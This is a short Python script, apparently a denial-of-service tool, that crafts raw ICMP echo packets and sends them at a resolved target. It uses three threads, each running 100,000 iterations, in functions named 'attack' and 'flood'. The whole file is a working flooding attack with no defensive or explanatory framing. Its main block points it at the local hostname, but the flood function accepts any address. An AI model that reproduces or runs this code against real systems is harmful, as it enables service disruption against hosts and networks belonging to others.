import socket
import struct
from random import randint
from threading import Thread


def create_icmp_packet():
    type = 8
    code = 0
    chksum = 0

    id = randint(0, 0xFFFF)
    seq = 1
    checksum = calculate_checksum(struct.pack("!BBHHH", type, code, chksum, id, seq))
    packet = struct.pack("!BBHHH", type, code, socket.htons(checksum), id, seq)
    return packet


def calculate_checksum(packet):
    s = 0
    n = len(packet) % 2
    for i in range(0, len(packet) - n, 2):
        s += packet[i] + (packet[i + 1] << 8)
    if n:
        s += packet[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xFFFF
    return s

def attack(IPAddr):
    for x in range(100000):
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.sendto(create_icmp_packet(), (IPAddr, 21))
        s.sendto(create_icmp_packet(), (IPAddr, 80))
        s.sendto(create_icmp_packet(), (IPAddr, 443))


def flood(url):
    IPAddr = socket.gethostbyname(url)
    print("[TARGET_HOSTNAME]" + url)
    print("[TARGET_IPADDRESS]" + IPAddr)
    t1 = Thread(target=attack, args=(IPAddr,))
    t2 = Thread(target=attack, args=(IPAddr,))
    t3 = Thread(target=attack, args=(IPAddr,))

    t1.start()
    t2.start()
    t3.start()

    t1.join()
    t2.join()
    t3.join()
    print("[FINISHED]")


if __name__ == "__main__":
    flood(socket.gethostname())